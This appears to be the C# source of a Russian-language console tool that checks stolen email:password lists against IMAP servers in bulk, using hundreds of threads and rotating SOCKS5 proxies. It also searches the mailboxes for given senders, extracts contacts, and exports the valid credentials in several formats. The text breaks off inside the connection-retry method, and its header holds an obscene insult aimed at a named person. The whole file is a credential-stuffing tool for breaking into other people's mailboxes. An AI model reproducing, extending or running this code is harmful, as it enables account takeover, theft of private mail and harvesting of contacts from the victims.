﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Security;
using MailKit.Search;
using MimeKit;
using System.Diagnostics;
using System.Timers;

namespace opentask
{
    class Program
    {
        static async Task Main()
        {
            Console.OutputEncoding = System.Text.Encoding.UTF8;
            var app = new MailScanner();
            await app.Run();
        }
    }

    class MailScanner
    {
        private string accountsFile = "accounts.txt";
        private string sendersFile = "senders.txt";
        private string workingFile = "working_accounts.txt";
        private string errorsFile = "errors.txt";
        private string results = "results.txt";
        private string proxyFile = "proxies.txt";
        private string contactsFile = "extracted_contacts.txt";
        private int maxThreads = 200;
        private int connectTimeout = 10;
        private bool proxyEnabled = false;
        private ProxyManager? proxyManager;
        private readonly object _contactsFileLock = new object(); // Потокобезопасная блокировка для записи в файл контактов
        
        // Новые поля для улучшенного функционала
        private bool isScanning = false;
        private int totalAccounts = 0;
        private int processedAccounts = 0;
        private int validAccounts = 0;
        private int foundMessages = 0;
        private DateTime scanStartTime;

        private ConcurrentBag<string> realTimeResults = new ConcurrentBag<string>();
        private CancellationTokenSource? cancellationTokenSource;
        private object consoleLock = new object();

        public async Task Run()
        {
            proxyManager = new ProxyManager(proxyFile);

            if (!File.Exists(accountsFile) || !File.Exists(sendersFile))
            {
                UI.WriteLine("accounts.txt или senders.txt не найден!", ConsoleColor.Red);
                UI.WaitKey("Нажмите любую клавишу для выхода...");
                return;
            }

            await ShowMainMenu();
        }

        private async Task ShowMainMenu()
        {
            string[] menuItems =
            {
                "⚙️  Настройки",
                "🚀 Запуск основной проверки",
                "📧 Сбор всех контактов",
                "📊 Просмотреть результаты",
                "💾 Экспорт результатов",
                "🔄 Выбор прокси",
                "👀 Просмотреть валид аккаунты",
                "❌ Выход"
            };
            
            int selected = 0;
            while (true)
            {
                DrawMainMenu(menuItems, selected);
                var key = Console.ReadKey(true);
                
                if (key.Key == ConsoleKey.UpArrow) 
                    selected = (selected - 1 + menuItems.Length) % menuItems.Length;
                else if (key.Key == ConsoleKey.DownArrow) 
                    selected = (selected + 1) % menuItems.Length;
                else if (key.Key == ConsoleKey.Enter)
                {
                    switch (selected)
                    {
                        case 0: await ShowSettingsMenu(); break;
                        case 1: await StartScanWithInterface(); break;
                        case 2: await StartContactsCollection(); break;
                        case 3: await ShowRealTimeResults(); break;
                        case 4: await ExportResults(); break;
                        case 5: await ShowProxySelectionMenu(); break;
                        case 6: await ShowWorkingAccountsQuick(); break;
                        case 7: return;
                    }
                }
                else if (key.Key == ConsoleKey.Q) break;
            }
        }

        private void DrawMainMenu(string[] items, int selected)
        {
            Console.Clear();
            DrawHeader("🚀 SUPER SIGMA DOUBLE R", "андрей иди нахуй сука ты", 100);
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"┌{new string('─', 98)}┐");
            Console.WriteLine($"│ Статус: {(isScanning ? "🔴 СКАНИРУЕТСЯ" : "🟢 ГОТОВ")} │ Прокси: {(proxyEnabled ? "🟢" : "🔴")} │ Потоки: {maxThreads,3} │ Таймаут: {connectTimeout,2}с │");
            Console.WriteLine($"└{new string('─', 98)}┘");
            Console.ResetColor();
            
            Console.WriteLine();
            for (int i = 0; i < items.Length; i++)
            {
                if (i == selected)
                {
                    Console.BackgroundColor = ConsoleColor.Gray;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.WriteLine($"> {items[i]}");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine($"  {items[i]}");
                }
            }
            
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Используйте ↑↓ для навигации, Enter для выбора, Q для выхода");
            Console.ResetColor();
        }

        private Task ShowSettingsMenu()
        {
            var settings = new[]
            {
                $"Прокси-сервера: {(proxyEnabled ? "🟢 ВКЛЮЧЕНЫ" : "🔴 ВЫКЛЮЧЕНЫ")}",
                $"Количество потоков: {maxThreads}",
                $"Таймаут подключения: {connectTimeout} секунд",
                $"Файл аккаунтов: {accountsFile}",
                $"Файл отправителей: {sendersFile}",
                $"Файл прокси: {proxyFile}",
                "🔙 Назад в главное меню"
            };

            int selected = 0;
            while (true)
            {
                Console.Clear();
                DrawHeader("⚙️ НАСТРОЙКИ", "Конфигурация сканера", 80);
                
                for (int i = 0; i < settings.Length; i++)
                {
                    if (i == selected)
                    {
                        Console.BackgroundColor = ConsoleColor.Gray;
                        Console.ForegroundColor = ConsoleColor.Black;
                        Console.WriteLine($"> {settings[i]}");
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.WriteLine($"  {settings[i]}");
                    }
                }
                
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("Используйте ↑↓ для навигации, Enter для изменения, ESC для возврата");
                Console.ResetColor();

                var key = Console.ReadKey(true);
                if (key.Key == ConsoleKey.UpArrow)
                    selected = (selected - 1 + settings.Length) % settings.Length;
                else if (key.Key == ConsoleKey.DownArrow)
                    selected = (selected + 1) % settings.Length;
                else if (key.Key == ConsoleKey.Enter)
                {
                    switch (selected)
                    {
                        case 0:
                            proxyEnabled = !proxyEnabled;
                            settings[0] = $"Прокси-сервера: {(proxyEnabled ? "🟢 ВКЛЮЧЕНЫ" : "🔴 ВЫКЛЮЧЕНЫ")}";
                            break;
                        case 1:
                            Console.Write("Введите новое количество потоков (50-500): ");
                            if (int.TryParse(Console.ReadLine(), out int threads) && threads >= 50 && threads <= 500)
                            {
                                maxThreads = threads;
                                settings[1] = $"Количество потоков: {maxThreads}";
                            }
                            break;
                        case 2:
                            Console.Write("Введите таймаут подключения в секундах (5-30): ");
                            if (int.TryParse(Console.ReadLine(), out int timeout) && timeout >= 5 && timeout <= 30)
                            {
                                connectTimeout = timeout;
                                settings[2] = $"Таймаут подключения: {connectTimeout} секунд";
                            }
                            break;
                        case 6:
                            return Task.CompletedTask;
                    }
                }
                else if (key.Key == ConsoleKey.Escape)
                    return Task.CompletedTask;
            }
        }

        private async Task StartScanWithInterface()
        {
            Console.Clear();
            DrawHeader("🚀 ЗАПУСК ПРОВЕРКИ", "Массовая проверка аккаунтов", 80);
            
            Console.WriteLine("📋 Подготовка к запуску...");
            
            // Сброс статистики
            processedAccounts = 0;
            validAccounts = 0;
            foundMessages = 0;
            
            // Запускаем сканирование напрямую
            await ScanAllAccountsWithRealTime();
            
            Console.WriteLine("\n✅ Проверка завершена!");
            Console.WriteLine("Нажмите любую клавишу для возврата в меню...");
            Console.ReadKey();
        }

        private async Task ShowScanProgress()
        {
            var lastUpdate = DateTime.Now;
            var lastProcessed = 0;
            
            while (isScanning)
            {
                Console.Clear();
                DrawHeader("📊 СКАНИРОВАНИЕ В ПРОЦЕССЕ", "репчик грязный", 80);
                
                var progress = totalAccounts > 0 ? (double)processedAccounts / totalAccounts * 100 : 0;
                var elapsed = DateTime.Now - scanStartTime;
                var currentSpeed = (processedAccounts - lastProcessed) / (DateTime.Now - lastUpdate).TotalSeconds;
                var overallSpeed = processedAccounts > 0 ? processedAccounts / elapsed.TotalSeconds : 0;
                var remaining = overallSpeed > 0 ? (totalAccounts - processedAccounts) / overallSpeed : 0;
                
                // Цветная статистика
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"┌{new string('─', 78)}┐");
                Console.WriteLine($"│ Прогресс: {progress,5:F1}% │ Обработано: {processedAccounts,6:N0} из {totalAccounts,6:N0} │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"│ Валидных: {validAccounts,6:N0} │ Найдено писем: {foundMessages,6:N0} │ Скорость: {overallSpeed,5:F1}/сек │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"└{new string('─', 78)}┘");
                Console.ResetColor();
                
                Console.WriteLine();
                
                // Улучшенный прогресс-бар с градиентом
                int barSize = 60;
                int filledSize = (int)(progress / 100 * barSize);
                string bar = "";
                
                for (int i = 0; i < barSize; i++)
                {
                    if (i < filledSize)
                    {
                        // Градиент от зеленого к желтому
                        if (i < filledSize * 0.7)
                            Console.ForegroundColor = ConsoleColor.Green;
                        else
                            Console.ForegroundColor = ConsoleColor.Yellow;
                        bar += "█";
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        bar += "░";
                    }
                }
                
                Console.Write($"[{bar}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{progress:F1}%");
                Console.ResetColor();
                Console.WriteLine();
                
                // Таблица последних результатов
                Console.WriteLine("📝 Последние результаты:");
                Console.WriteLine(new string('─', 80));
                
                var latestResults = realTimeResults.TakeLast(15).Reverse();
                if (latestResults.Any())
                {
                    foreach (var result in latestResults)
                    {
                        if (result.Contains("✅"))
                            Console.ForegroundColor = ConsoleColor.Green;
                        else if (result.Contains("⚠️"))
                            Console.ForegroundColor = ConsoleColor.Yellow;
                        else if (result.Contains("❌"))
                            Console.ForegroundColor = ConsoleColor.Red;
                        
                        Console.WriteLine($"  {result}");
                        Console.ResetColor();
                    }
                }
                else
                {
                    Console.WriteLine("  Нет результатов...");
                }
                
                Console.WriteLine(new string('─', 80));
                Console.WriteLine();
                
                // Панель управления
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("🎮 УПРАВЛЕНИЕ:");
                Console.ResetColor();
                Console.WriteLine("  [ESC] - Остановить сканирование");
                Console.WriteLine("  [R] - Просмотреть детальные результаты");
                Console.WriteLine("  [E] - Экспортировать результаты");
                Console.WriteLine("  [S] - Настройки сканирования");
                
                lastUpdate = DateTime.Now;
                lastProcessed = processedAccounts;
                
                // Обработка нажатий клавиш
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    switch (key.Key)
                    {
                        case ConsoleKey.Escape:
                            cancellationTokenSource?.Cancel();
                            return;
                        case ConsoleKey.R:
                            await ShowRealTimeResults();
                            break;
                        case ConsoleKey.E:
                            await ExportResults();
                            break;
                        case ConsoleKey.S:
                            await ShowQuickSettings();
                            break;
                    }
                }
                
                await Task.Delay(500); // Обновление каждые 0.5 секунды
            }
        }

        private async Task ShowRealTimeResults()
        {
            Console.Clear();
            DrawHeader("📋 ДЕТАЛЬНЫЕ РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ", "Анализ результатов сканирования", 90);
            
            // Статистика по типам результатов
            var totalChecked = processedAccounts;
            var successRate = totalChecked > 0 ? (double)validAccounts / totalChecked * 100 : 0;
            var messageRate = validAccounts > 0 ? (double)foundMessages / validAccounts * 100 : 0;
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("📊 СТАТИСТИКА:");
            Console.ResetColor();
            Console.WriteLine($"  Всего проверено: {totalChecked:N0}");
            Console.WriteLine($"  Валидные аккаунты: {validAccounts:N0} ({successRate:F1}%)");
            Console.WriteLine($"  С сообщениями: {foundMessages:N0} ({messageRate:F1}% от валидных)");
            Console.WriteLine();
            
            // Рабочие аккаунты с подсветкой
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("🎯 РАБОЧИЕ АККАУНТЫ:");
            Console.ResetColor();
            
            if (File.Exists(workingFile))
            {
                var working = File.ReadAllLines(workingFile);
                if (working.Length > 0)
                {
                    // Группировка по доменам
                    var domainGroups = working
                        .Select(line => new { Line = line, Domain = line.Split('@').LastOrDefault()?.Split(':').FirstOrDefault() ?? "unknown" })
                        .GroupBy(x => x.Domain)
                        .OrderByDescending(g => g.Count())
                        .ToList();
                    
                    Console.WriteLine($"  Всего рабочих: {working.Length:N0}");
                    Console.WriteLine("  Топ доменов:");
                    
                    foreach (var group in domainGroups.Take(5))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"    {group.Key}: {group.Count()} аккаунтов");
                        Console.ResetColor();
                    }
                    
                    Console.WriteLine("\n  Последние 10 рабочих аккаунтов:");
                    foreach (var line in working.TakeLast(10))
                    {
                        var parts = line.Split(new[] { ':', ';' }, 2);
                        var email = parts.Length > 0 ? parts[0] : line;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"    ✅ {email}");
                        Console.ResetColor();
                    }
                }
                else
                {
                    Console.WriteLine("  Пока нет рабочих аккаунтов");
                }
            }
            else
            {
                Console.WriteLine("  Файл с результатами не найден");
            }
            
            Console.WriteLine();
            
            // Анализ ошибок
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("❌ АНАЛИЗ ОШИБОК:");
            Console.ResetColor();
            
            if (File.Exists(errorsFile))
            {
                var errors = File.ReadAllLines(errorsFile);
                if (errors.Any())
                {
                    // Группировка ошибок по типам
                    var errorGroups = errors
                        .Select(line => new { Line = line, Type = ExtractErrorType(line) })
                        .GroupBy(x => x.Type)
                        .OrderByDescending(g => g.Count())
                        .ToList();
                    
                    Console.WriteLine($"  Всего ошибок: {errors.Length:N0}");
                    Console.WriteLine("  Типы ошибок:");
                    
                    foreach (var group in errorGroups.Take(10))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"    {group.Key}: {group.Count()}");
                        Console.ResetColor();
                    }
                    
                    Console.WriteLine("\n  Последние 10 ошибок:");
                    foreach (var error in errors.TakeLast(10))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"    ❌ {error}");
                        Console.ResetColor();
                    }
                }
                else
                {
                    Console.WriteLine("  Пока нет ошибок");
                }
            }
            else
            {
                Console.WriteLine("  Файл с ошибками не найден");
            }
            
            Console.WriteLine();
            
            // Реал-тайм лог
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("📝 РЕАЛ-ТАЙМ ЛОГ:");
            Console.ResetColor();
            
            var recentLogs = realTimeResults.TakeLast(5).ToList();
            if (recentLogs.Any())
            {
                foreach (var log in recentLogs)
                {
                    Console.WriteLine($"  {log}");
                }
            }
            else
            {
                Console.WriteLine("  Нет последних записей");
            }
            
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("🎮 УПРАВЛЕНИЕ:");
            Console.ResetColor();
            Console.WriteLine("  [R] - Обновить результаты");
            Console.WriteLine("  [E] - Экспортировать все результаты");
            Console.WriteLine("  [ESC] - Вернуться к сканированию");
            
            var key = Console.ReadKey(true).Key;
            switch (key)
            {
                case ConsoleKey.R:
                    await ShowRealTimeResults();
                    break;
                case ConsoleKey.E:
                    await ExportResults();
                    break;
                case ConsoleKey.Escape:
                    return;
            }
        }

        private Task ShowQuickSettings()
        {
            Console.Clear();
            DrawHeader("⚡ БЫСТРЫЕ НАСТРОЙКИ", "Изменение параметров во время сканирования", 80);
            
            Console.WriteLine("Текущие настройки:");
            Console.WriteLine($"🔄 Потоки: {maxThreads}");
            Console.WriteLine($"⏱️  Таймаут: {connectTimeout} секунд");
            Console.WriteLine($"🌐 Прокси: {(proxyEnabled ? "ВКЛЮЧЕНЫ" : "ВЫКЛЮЧЕНЫ")}");
            
            Console.WriteLine("\nЧто вы хотите изменить?");
            Console.WriteLine("1. Количество потоков");
            Console.WriteLine("2. Таймаут подключения");
            Console.WriteLine("3. Прокси-сервера");
            Console.WriteLine("4. Назад");
            
            Console.Write("\nВаш выбор (1-4): ");
            var key = Console.ReadKey().Key;
            Console.WriteLine();
            
            switch (key)
            {
                case ConsoleKey.D1:
                    Console.Write("Введите новое количество потоков (10-1000): ");
                    if (int.TryParse(Console.ReadLine(), out int threads) && threads >= 10 && threads <= 1000)
                    {
                        maxThreads = threads;
                        Console.WriteLine($"✅ Количество потоков изменено на {maxThreads}");
                    }
                    else
                    {
                        Console.WriteLine("❌ Неверное значение");
                    }
                    break;
                    
                case ConsoleKey.D2:
                    Console.Write("Введите новый таймаут подключения в секундах (3-60): ");
                    if (int.TryParse(Console.ReadLine(), out int timeout) && timeout >= 3 && timeout <= 60)
                    {
                        connectTimeout = timeout;
                        Console.WriteLine($"✅ Таймаут изменен на {connectTimeout} секунд");
                    }
                    else
                    {
                        Console.WriteLine("❌ Неверное значение");
                    }
                    break;
                    
                case ConsoleKey.D3:
                    proxyEnabled = !proxyEnabled;
                    Console.WriteLine($"✅ Прокси {(proxyEnabled ? "включены" : "выключены")}");
                    break;
            }
            
            Console.WriteLine("\nНажмите любую клавишу для возврата...");
            Console.ReadKey();
            return Task.CompletedTask;
        }

        private string ExtractErrorType(string errorLine)
        {
            if (string.IsNullOrWhiteSpace(errorLine))
                return "Unknown";
                
            errorLine = errorLine.ToLower();
            
            if (errorLine.Contains("authentication") || errorLine.Contains("auth"))
                return "Authentication Error";
            if (errorLine.Contains("connection") || errorLine.Contains("connect"))
                return "Connection Error";
            if (errorLine.Contains("timeout"))
                return "Timeout Error";
            if (errorLine.Contains("ssl") || errorLine.Contains("tls"))
                return "SSL/TLS Error";
            if (errorLine.Contains("invalid") || errorLine.Contains("incorrect"))
                return "Invalid Credentials";
            if (errorLine.Contains("server") || errorLine.Contains("imap"))
                return "Server Error";
            if (errorLine.Contains("network"))
                return "Network Error";
            if (errorLine.Contains("proxy"))
                return "Proxy Error";
                
            return "Other Error";
        }

        private async Task ExportResults()
        {
            Console.Clear();
            DrawHeader("📤 ЭКСПОРТ РЕЗУЛЬТАТОВ", "Экспорт результатов сканирования", 80);
            
            if (!File.Exists(workingFile))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("❌ Нет результатов для экспорта");
                Console.ResetColor();
                Console.WriteLine("\nНажмите любую клавишу...");
                Console.ReadKey();
                return;
            }
            
            var working = File.ReadAllLines(workingFile);
            if (working.Length == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("⚠️ Рабочих аккаунтов пока нет");
                Console.ResetColor();
                Console.WriteLine("\nНажмите любую клавишу...");
                Console.ReadKey();
                return;
            }
            
            Console.WriteLine($"📊 Найдено рабочих аккаунтов: {working.Length:N0}");
            Console.WriteLine("\n🎯 Выберите формат экспорта:");
            Console.WriteLine("1. 📄 Простой список (email:password)");
            Console.WriteLine("2. 📋 Полный формат (с сервером и портом)");
            Console.WriteLine("3. 📊 Excel файл с статистикой");
            Console.WriteLine("4. 🔍 По доменам (отдельные файлы)");
            Console.WriteLine("5. ❌ Отмена");
            Console.Write("\nВаш выбор (1-5): ");
            
            var choice = Console.ReadKey().Key;
            Console.WriteLine();
            
            var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            
            try
            {
                switch (choice)
                {
                    case ConsoleKey.D1:
                        await ExportSimpleFormat(working, timestamp);
                        break;
                    case ConsoleKey.D2:
                        await ExportFullFormat(working, timestamp);
                        break;
                    case ConsoleKey.D3:
                        await ExportExcelFormat(working, timestamp);
                        break;
                    case ConsoleKey.D4:
                        await ExportByDomains(working, timestamp);
                        break;
                    default:
                        Console.WriteLine("Экспорт отменен");
                        return;
                }
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("✅ Экспорт завершен успешно!");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"❌ Ошибка экспорта: {ex.Message}");
                Console.ResetColor();
            }
            
            Console.WriteLine("\nНажмите любую клавишу...");
            Console.ReadKey();
        }

        private async Task ExportSimpleFormat(string[] working, string timestamp)
        {
            var exportFile = $"working_accounts_simple_{timestamp}.txt";
            var simpleLines = working.Select(line => 
            {
                var parts = line.Split(new[] { ':', ';' }, 2);
                return parts.Length >= 2 ? $"{parts[0]}:{parts[1]}" : line;
            }).ToArray();
            
            await File.WriteAllLinesAsync(exportFile, simpleLines);
            Console.WriteLine($"📄 Экспортировано {simpleLines.Length} аккаунтов в {exportFile}");
        }

        private async Task ExportFullFormat(string[] working, string timestamp)
        {
            var exportFile = $"working_accounts_full_{timestamp}.txt";
            var fullLines = working.Select(line => 
            {
                var parts = line.Split(new[] { ':', ';' }, 5);
                if (parts.Length >= 5)
                {
                    return $"Email: {parts[0]} | Пароль: {parts[1]} | Сервер: {parts[2]}:{parts[3]} | SSL: {parts[4]}";
                }
                return line;
            }).ToArray();
            
            await File.WriteAllLinesAsync(exportFile, fullLines);
            Console.WriteLine($"📋 Экспортировано {fullLines.Length} аккаунтов в {exportFile}");
        }

        private async Task ExportExcelFormat(string[] working, string timestamp)
        {
            var exportFile = $"working_accounts_excel_{timestamp}.txt";
            var csvLines = new List<string>();
            csvLines.Add("Email,Password,Server,Port,SSL,Domain");
            
            foreach (var line in working)
            {
                var parts = line.Split(new[] { ':', ';' }, 5);
                if (parts.Length >= 5)
                {
                    var domain = parts[0].Split('@').LastOrDefault() ?? "unknown";
                    csvLines.Add($"{parts[0]},{parts[1]},{parts[2]},{parts[3]},{parts[4]},{domain}");
                }
            }
            
            await File.WriteAllLinesAsync(exportFile, csvLines);
            Console.WriteLine($"📊 Экспортировано {working.Length} аккаунтов в CSV файл {exportFile}");
        }

        private async Task ExportByDomains(string[] working, string timestamp)
        {
            var domainGroups = working
                .GroupBy(line => {
                    var emailPart = line.Split('@').LastOrDefault() ?? "unknown";
                    // Удаляем пароль и другие части после разделителя
                    var domainPart = emailPart.Split(new[] { ':', ';' }, 2).FirstOrDefault() ?? "unknown";
                    return domainPart;
                })
                .OrderByDescending(g => g.Count())
                .ToList();
            
            Console.WriteLine($"🔍 Найдено {domainGroups.Count} различных доменов");
            
            var exportDir = $"domain_export_{timestamp}";
            Directory.CreateDirectory(exportDir);
            
            foreach (var group in domainGroups)
            {
                var domainFile = Path.Combine(exportDir, $"{group.Key}_{timestamp}.txt");
                await File.WriteAllLinesAsync(domainFile, group.ToArray());
                Console.WriteLine($"  📁 {group.Key}: {group.Count()} аккаунтов");
            }
            
            Console.WriteLine($"📂 Все файлы сохранены в папку {exportDir}");
        }

private async Task ShowProxySelectionMenu()
{
    while (true)
    {
        Console.Clear();
        DrawHeader("🔧 ВЫБОР ПРОКСИ", "Управление SOCKS5 прокси", 80);
        
        var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
        HashSet<string> deadProxies = proxyManager?.GetDeadProxies() ?? new HashSet<string>();
        var aliveCount = proxyManager?.GetAliveProxiesCount() ?? 0;
        var selectedProxy = proxyManager?.GetSelectedProxy();

        Console.WriteLine($"📁 Файл с прокси: {proxyFile}");
        Console.WriteLine($"📊 Всего валидных SOCKS5 прокси: {allProxies.Count}");
        Console.WriteLine($"✅ Живых прокси: {aliveCount}");
        Console.WriteLine($"❌ Мертвых прокси: {deadProxies.Count}");
        if (selectedProxy != null)
        {
            Console.WriteLine($"🎯 Выбран ручной прокси: {selectedProxy}");
        }
        else
        {
            Console.WriteLine("🔄 Используется автоматическая ротация прокси");
        }

        Console.WriteLine("\nДоступные действия:");
        Console.WriteLine("1. Показать все прокси и выбрать один");
        Console.WriteLine("2. Проверить все прокси на живучесть");
        Console.WriteLine("3. Сбросить ручной выбор (вернуться к ротации)");
        Console.WriteLine("4. Восстановить все мертвые прокси");
        Console.WriteLine("5. Перезагрузить прокси из файла");
        Console.WriteLine("ESC. Вернуться в главное меню");

        var key = Console.ReadKey(true);
        if (key.Key == ConsoleKey.Escape)
        {
            return;
        }
        else if (key.Key == ConsoleKey.D1)
        {
            await ShowProxyListAndSelect();
        }
        else if (key.Key == ConsoleKey.D2)
        {
            await TestAllProxies();
        }
        else if (key.Key == ConsoleKey.D3)
        {
            proxyManager?.SetManualProxy(null);
            Console.WriteLine("\n✅ Ручной выбор прокси отключен");
            Console.ReadKey();
        }
        else if (key.Key == ConsoleKey.D4)
        {
            proxyManager?.ReviveAllProxies();
            Console.WriteLine("\n✅ Все прокси восстановлены");
            Console.ReadKey();
        }
        else if (key.Key == ConsoleKey.D5)
        {
            proxyManager = new ProxyManager(proxyFile);
            Console.WriteLine("\n✅ Прокси перезагружены из файла");
            Console.ReadKey();
        }
    }
}

private async Task ShowProxyListAndSelect()
{
    var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
    if (allProxies.Count == 0)
    {
        Console.WriteLine("\n❌ Нет загруженных прокси");
        Console.ReadKey();
        return;
    }

    int selected = 0;
    while (true)
    {
        Console.Clear();
        DrawHeader("📋 СПИСОК ПРОКСИ", "Выберите прокси для использования", 80);
        
        for (int i = 0; i < allProxies.Count; i++)
        {
            var isDead = proxyManager?.GetDeadProxies().Contains(allProxies[i]) ?? false;
            var isSelected = i == selected;
            var currentSelected = proxyManager?.GetSelectedProxy() == allProxies[i];

            if (isSelected)
            {
                Console.BackgroundColor = ConsoleColor.Gray;
                Console.ForegroundColor = ConsoleColor.Black;
            }
            else if (isDead)
            {
                Console.ForegroundColor = ConsoleColor.Red;
            }
            else if (currentSelected)
            {
                Console.ForegroundColor = ConsoleColor.Green;
            }

            Console.WriteLine($"{(isSelected ? "> " : "  ")}{allProxies[i]} {(isDead ? "[МЕРТВ]" : "")}{(currentSelected ? "[АКТИВЕН]" : "")}");
            Console.ResetColor();
        }

        var key = Console.ReadKey(true);
        if (key.Key == ConsoleKey.Escape)
        {
            break;
        }
        else if (key.Key == ConsoleKey.UpArrow)
        {
            selected = (selected - 1 + allProxies.Count) % allProxies.Count;
        }
        else if (key.Key == ConsoleKey.DownArrow)
        {
            selected = (selected + 1) % allProxies.Count;
        }
        else if (key.Key == ConsoleKey.Enter)
        {
            var chosenProxy = allProxies[selected];
            proxyManager?.SetManualProxy(chosenProxy);
            
            Console.WriteLine($"\n🔍 Проверяем прокси {chosenProxy}...");
            var isOk = await proxyManager!.TestProxyAsync(chosenProxy, TimeSpan.FromSeconds(10));
            if (isOk)
            {
                Console.WriteLine($"✅ Прокси {chosenProxy} работает и установлен как активный");
            }
            else
            {
                Console.WriteLine($"❌ Прокси {chosenProxy} не работает");
            }
            Console.ReadKey();
            break;
        }
    }
}

private async Task TestAllProxies()
{
    var allProxies = proxyManager?.GetAllProxies() ?? new List<string>();
    if (allProxies.Count == 0)
    {
        Console.WriteLine("\n❌ Нет загруженных прокси");
        Console.ReadKey();
        return;
    }

    Console.WriteLine("\n🚀 Начинаем проверку всех прокси...");
    foreach (var proxy in allProxies)
    {
        await proxyManager!.TestProxyAsync(proxy, TimeSpan.FromSeconds(10));
    }

    Console.WriteLine($"\n✅ Проверка завершена! Живых: {proxyManager.GetAliveProxiesCount()}, мертвых: {proxyManager.GetDeadProxies().Count}");
    Console.ReadKey();
}

        private Task ShowWorkingAccountsQuick()
        {
            Console.Clear();
            DrawHeader("👀 СПИСОК ВОРКИНГ АККАУНТОВ", "Рабочие почтовые аккаунты", 80);

            if (!File.Exists(workingFile))
            {
                Console.WriteLine("❌ Файл с рабочими аккаунтами не найден!");
                Console.WriteLine("\nНажмите любую клавишу для возврата...");
                Console.ReadKey();
                return Task.CompletedTask;
            }

            var workingAccounts = File.ReadAllLines(workingFile).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
            
            if (workingAccounts.Count == 0)
            {
                Console.WriteLine("ℹ️ В файле нет рабочих аккаунтов");
                Console.WriteLine("\nНажмите любую клавишу для возврата...");
                Console.ReadKey();
                return Task.CompletedTask;
            }

            Console.WriteLine($"✅ Всего рабочих аккаунтов: {workingAccounts.Count}\n");
            
            // Показываем первые 50 аккаунтов, чтобы не перегружать консоль
            var toShow = workingAccounts.Take(50).ToList();
            foreach (var line in toShow)
            {
                var parts = line.Split(new[] { ':', ';' }, 2);
                if (parts.Length >= 1)
                {
                    Console.WriteLine($"📧 {parts[0]}");
                }
            }

            if (workingAccounts.Count > 50)
            {
                Console.WriteLine($"\n... и еще {workingAccounts.Count - 50} аккаунтов. Всего сохранено в {workingFile}");
            }

            Console.WriteLine("\nНажмите любую клавишу для возврата в меню...");
            Console.ReadKey();
            return Task.CompletedTask;
        }

        private void DrawHeader(string title, string subtitle, int width)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(new string('═', width));
            Console.WriteLine($"║{title.CenterString(width - 2)}║");
            if (!string.IsNullOrEmpty(subtitle))
                Console.WriteLine($"║{subtitle.CenterString(width - 2)}║");
            Console.WriteLine(new string('═', width));
            Console.ResetColor();
        }

        // Оптимизированные методы для улучшенной эффективности
        private async Task<(bool Success, string Message, ImapClient? Client, string UsedServer, int UsedPort, bool UsedSsl)> TryConnectWithRetry(string email, string password, string domain, string? proxy)
        {
            var serverAttempts = await ImapHelper.GetFullServerAttemptsAsync(domain, email, proxy);
            
            // Первоначальная попытка
            var result = await ImapHelper.TryConnectAsync(email, password, serverAttempts, TimeSpan.FromSeconds(connectTimeout), proxy);
            if (result.Success) return result;

            // Повторная попытка без прокси если первая не удалась
            if (proxy != null)
            {
                var noProxyAttempts = await ImapHelper.GetFullServerAttemptsAsync(domain, email, null);
                result = await ImapHelper.TryConnectAsync(email, password, noProxyAttempts, TimeSpan.FromSeconds(connectTimeout), null);
                if (result.Success) return result;
            }

            // Повторная попытка с увеличенным таймаутом для популярных доменов
            var popularDomains = new[] { "gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "t-online.de", "web.de", "gmx.de", "gmx.net", "freenet.de", "mail.de" };
            if (popularDomains.Contains(domain))
            {
                var extendedTimeout = TimeSpan.FromSeconds(connectTimeout * 2);
                result = await ImapHelper.TryConnectAsync(email, password, serverAttempts, extendedTimeout, proxy);
            }
            
            // Специальная обработка для t-online доменов
